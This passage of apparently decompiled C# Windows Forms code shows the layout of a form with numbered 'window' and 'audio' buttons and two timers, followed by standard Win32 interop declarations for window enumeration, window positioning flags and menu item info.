    this.button14.Size = new Size(194, 68);
    this.button14.TabIndex = 13;
    this.button14.Text = "window 4";
    this.button14.UseVisualStyleBackColor = true;
    this.button14.Click += new EventHandler(this.button14_Click);
    this.button15.Location = new Point(411, 310);
    this.button15.Name = "button15";
    this.button15.Size = new Size(194, 68);
    this.button15.TabIndex = 14;
    this.button15.Text = "audio 5";
    this.button15.UseVisualStyleBackColor = true;
    this.button15.Click += new EventHandler(this.button15_Click);
    this.timer2.Interval = 60000;
    this.timer2.Tick += new EventHandler(this.timer2_Tick);
    this.timer3.Enabled = true;
    this.timer3.Interval = 300000;
    this.timer3.Tick += new EventHandler(this.timer3_Tick);
    this.AutoScaleDimensions = new SizeF(6f, 12f);
    this.AutoScaleMode = AutoScaleMode.Font;
    this.ClientSize = new Size(616, 396);
    this.Controls.Add((Control) this.button15);
    this.Controls.Add((Control) this.button14);
    this.Controls.Add((Control) this.button13);
    this.Controls.Add((Control) this.button12);
    this.Controls.Add((Control) this.button11);
    this.Controls.Add((Control) this.button10);
    this.Controls.Add((Control) this.button9);
    this.Controls.Add((Control) this.button8);
    this.Controls.Add((Control) this.button7);
    this.Controls.Add((Control) this.button6);
    this.Controls.Add((Control) this.button5);
    this.Controls.Add((Control) this.button4);
    this.Controls.Add((Control) this.button3);
    this.Controls.Add((Control) this.button2);
    this.Controls.Add((Control) this.button1);
    this.Name = nameof (Form1);
    this.ShowIcon = false;
    this.ShowInTaskbar = false;
    this.Text = nameof (Form1);
    this.Load += new EventHandler(this.Form1_Load);
    this.ResumeLayout(false);
  }

  public delegate bool EnumedWindow(IntPtr handleWindow, ArrayList handles);

  internal struct RECT
  {
    public int left;
    public int top;
    public int right;
    public int bottom;
  }

  public enum SpecialWindowHandles
  {
    HWND_NOTOPMOST = -2, // 0xFFFFFFFE
    HWND_TOPMOST = -1, // 0xFFFFFFFF
    HWND_TOP = 0,
    HWND_BOTTOM = 1,
  }

  [Flags]
  public enum SetWindowPosFlags : uint
  {
    SWP_ASYNCWINDOWPOS = 16384, // 0x00004000
    SWP_DEFERERASE = 8192, // 0x00002000
    SWP_DRAWFRAME = 32, // 0x00000020
    SWP_FRAMECHANGED = SWP_DRAWFRAME, // 0x00000020
    SWP_HIDEWINDOW = 128, // 0x00000080
    SWP_NOACTIVATE = 16, // 0x00000010
    SWP_NOCOPYBITS = 256, // 0x00000100
    SWP_NOMOVE = 2,
    SWP_NOOWNERZORDER = 512, // 0x00000200
    SWP_NOREDRAW = 8,
    SWP_NOREPOSITION = SWP_NOOWNERZORDER, // 0x00000200
    SWP_NOSENDCHANGING = 1024, // 0x00000400
    SWP_NOSIZE = 1,
    SWP_NOZORDER = 4,
    SWP_SHOWWINDOW = 64, // 0x00000040
  }

  [StructLayout(LayoutKind.Sequential)]
  public class MENUITEMINFO
  {
    public int cbSize;
    public uint fMask;
    public uint fType;
    public uint fState;
    public uint wID;
    public IntPtr hSubMenu;
    public IntPtr hbmpChecked;
    public IntPtr hbmpUnchecked;
    public IntPtr dwItemData;
    public IntPtr dwTypeData;
    public uint cch;
    public IntPtr hbmpItem;

    public MENUITEMINFO() => this.cbSize = Marshal.SizeOf(typeof (Form1.MENUITEMINFO));
  }
}
